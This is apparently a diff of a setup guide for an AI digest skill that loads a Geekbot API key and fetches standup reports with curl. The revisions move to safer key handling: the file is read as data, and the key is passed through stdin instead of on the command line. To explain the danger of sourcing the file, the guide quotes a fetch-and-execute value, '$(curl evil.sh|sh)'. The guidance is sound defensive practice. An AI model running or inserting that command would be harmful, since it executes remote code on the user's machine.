@@ -7,26 +7,39 @@ Every fact below is verified against the official `geekbot-com/geekbot-mcp` sour
 ## Access — resolve before relying on Geekbot (free first)
 - API access is a **Basic (paid) tier** feature; the free Starter plan (≤10 active participants) does NOT expose the API. **If the AUT standup has >10 active participants the team is already on Basic → the key is free.**
 - The key is **personal/per-user** (no workspace/admin key). A key whose owner is a **participant of the shared AUT standup reads EVERY member's answers for that standup in ONE call** — `GET /v1/reports/?standup_id=<id>` **with `user_id` OMITTED returns all participants' reports** (confirmed in the official `geekbot-mcp` `fetch_reports`: "user_id … default None … means for all members"). So one key (Sashko's / Andy's, or a dedicated account) pulls the WHOLE team from the shared channel — exactly the goal. Never loop per person.
-- **The key is LOCAL ONLY.** It lives in `~/.geekbot/env` (the user's `$HOME`, OUTSIDE this repo) as `GEEKBOT_API_KEY=...`, `chmod 600`. It is **never committed** (`.env`/`*.env` are gitignored, and it isn't in the repo tree anyway), **never printed/echoed/logged**, and **never sent anywhere** — the skill only references `$GEEKBOT_API_KEY` by name inside the curl call. The interactive `/ai-digest --setup` flow walks the human through creating it on their own machine (they paste the key into their own terminal, never into chat). Pin the resolved `standup_id` + question→bucket map in `~/.claude/ai-digest/config.md` (also local, not the repo).
+- **The key is LOCAL ONLY.** It lives in `~/.geekbot/env` (the user's `$HOME`, OUTSIDE this repo) as `GEEKBOT_API_KEY=...`, `chmod 600`. It is **never committed** (`.env`/`*.env` are gitignored, and it isn't in the repo tree anyway), **never printed/echoed/logged**, and **never sent anywhere** — the skill only references `$GEEKBOT_API_KEY` by name inside the curl call. The interactive `/ai-digest --setup` flow **creates the file for them** (placeholder line, `chmod 600`) and tells them to open it and paste the key after `GEEKBOT_API_KEY=` — the key goes **into the file**, never into the chat and never typed at a terminal prompt. Pin the resolved `standup_id` + question→bucket map in `~/.claude/ai-digest/config.md` (also local, not the repo).
 
 ### Coverage test (run ONCE when the key arrives, before trusting Geekbot)
 ```bash
-source ~/.geekbot/env
-curl -sS https://api.geekbot.com/v1/standups/ -H "Authorization: $GEEKBOT_API_KEY" \
+# read the key as DATA — NEVER `source` it (a value like $(...) or a backtick would EXECUTE → RCE)
+GEEKBOT_API_KEY=$(grep -m1 '^GEEKBOT_API_KEY=' ~/.geekbot/env 2>/dev/null | cut -d= -f2-)
+GEEKBOT_API_KEY=${GEEKBOT_API_KEY%$'\r'}; GEEKBOT_API_KEY="${GEEKBOT_API_KEY//[[:space:]]/}"
+GEEKBOT_API_KEY=${GEEKBOT_API_KEY#\"}; GEEKBOT_API_KEY=${GEEKBOT_API_KEY%\"}
+[ -n "$GEEKBOT_API_KEY" ] || { echo "[BROKEN] ~/.geekbot/env has no GEEKBOT_API_KEY value — open the file and paste your key"; exit 1; }
+WK_AGO=$(date -u -d '7 days ago' +%s 2>/dev/null || date -u -v-7d +%s)   # GNU(Linux) || BSD(macOS)
+# key passed via stdin (-K -), NEVER argv (ps-visible / set -x leaks it):
+printf 'header = "Authorization: %s"\n' "$GEEKBOT_API_KEY" | curl -sS -K - https://api.geekbot.com/v1/standups/ \
 | python3 -c "import sys,json;[print(s['id'],s['name'],'->',[u['username'] for u in s.get('users',[])]) for s in json.load(sys.stdin)]"
-# pick the AUT standup id, then:
-source ~/.geekbot/env
-curl -sS "https://api.geekbot.com/v1/reports/?standup_id=<ID>&after=$(date -v-7d +%s)&limit=100" -H "Authorization: $GEEKBOT_API_KEY" \
+# pick the AUT standup id, then (reuse $GEEKBOT_API_KEY from above — same shell):
+printf 'header = "Authorization: %s"\n' "$GEEKBOT_API_KEY" | curl -sS -K - "https://api.geekbot.com/v1/reports/?standup_id=<ID>&after=$WK_AGO&limit=100" \
 | python3 -c "import sys,json;r=json.load(sys.stdin);print('reports',len(r));print('reporters',sorted({x['member']['username'] for x in r}))"
 ```
 PASS iff the 2nd call lists usernames **other than the key owner's**, covering the AUT roster. If only the owner → wrong key / per-person standups → re-ask; do NOT Slack-scrape.
 
 ## The gather rules (the orchestrator pastes these INLINE into the sub-agent prompt — never a file path)
 
-### Secret + env (CRITICAL — get this wrong and it silently always-OFF or leaks the key)
-- Env vars do **NOT** inherit into a sub-agent's fresh shell. The key must be sourced **inside the same Bash call** as the curl: `source ~/.geekbot/env && curl ...`. Do NOT rely on the orchestrator having exported it.
-- **Never put the key in argv** (`-H "Authorization: $KEY"` is ps-visible and `set -x` leaks it into traces/the artifact). Pass the header via stdin:
-  `source ~/.geekbot/env && printf 'header = "Authorization: %s"\n' "$GEEKBOT_API_KEY" | curl -sS -K - "https://api.geekbot.com/v1/reports/?standup_id=$SID&after=$F&before=$T&limit=100"`
+### Secret + env (CRITICAL — get this wrong and it silently always-OFF, leaks the key, or runs arbitrary code)
+- **NEVER `source` / `.` the key file.** `source ~/.geekbot/env` *executes* the file as shell — a value like `GEEKBOT_API_KEY=$(curl evil.sh|sh)` or a backtick would run on read (**remote code execution**). Read the value as **data** instead, inside the same Bash call as the curl (env does NOT inherit from the orchestrator's shell, so read it here every time):
+  ```bash
+  GEEKBOT_API_KEY=$(grep -m1 '^GEEKBOT_API_KEY=' ~/.geekbot/env 2>/dev/null | cut -d= -f2-)
+  GEEKBOT_API_KEY=${GEEKBOT_API_KEY%$'\r'}; GEEKBOT_API_KEY="${GEEKBOT_API_KEY//[[:space:]]/}"  # strip CRLF + stray ws
+  GEEKBOT_API_KEY=${GEEKBOT_API_KEY#\"}; GEEKBOT_API_KEY=${GEEKBOT_API_KEY%\"}                  # strip optional wrapping quotes
+  [ -n "$GEEKBOT_API_KEY" ] || { echo "[BROKEN] geekbot: key file present but value empty"; }  # never proceed with an empty key
+  ```
+  `grep | cut` reads the literal characters after the first `=`; nothing in the value is ever evaluated. This is the **only** sanctioned way to load the key.
+- **OFF vs BROKEN — loud-fail (never silently drop the source):** no `~/.geekbot/env` / empty value / no pinned `standup_id` = **OFF** (silent — the normal state; the digest runs on notes+ClickUp). A key that IS present but the API answers 401 / empty / error = **BROKEN** — do NOT downgrade BROKEN to OFF. Surface a loud `⚠ Geekbot configured but auth failed (HTTP <code>) — digest ran WITHOUT it; rotate the key in ~/.geekbot/env` line in BOTH the preflight table and the digest footer, so a dead or rotated key can't quietly remove a whole source.
+- **Never put the key in argv** (`-H "Authorization: $KEY"` is ps-visible and `set -x` leaks it into traces/the artifact). Pass the header via stdin, reusing the `$GEEKBOT_API_KEY` read as data above:
+  `printf 'header = "Authorization: %s"\n' "$GEEKBOT_API_KEY" | curl -sS -K - "https://api.geekbot.com/v1/reports/?standup_id=$SID&after=$F&before=$T&limit=100"`
   No `set -x`/`-v`/`-i`; body-only; scrub any echo of the key before returning. Reference the key by NAME only.
 
 ### Endpoint facts
